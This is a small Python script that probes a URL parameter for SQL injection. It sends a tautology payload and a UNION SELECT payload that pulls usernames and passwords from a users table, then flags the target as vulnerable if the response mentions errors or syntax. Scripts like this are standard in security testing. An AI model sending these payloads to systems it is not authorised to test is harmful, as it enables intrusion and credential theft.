import requests

def test_sql_injection(url):
    payloads = ["' OR 1=1 --", "' UNION SELECT NULL, username, password FROM users --"]
    for payload in payloads:
        test_url = f"{url}?id={payload}"
        response = requests.get(test_url)
        if "error" in response.text.lower() or "syntax" in response.text.lower():
            return "Vulnerable"
    return "Not Vulnerable"
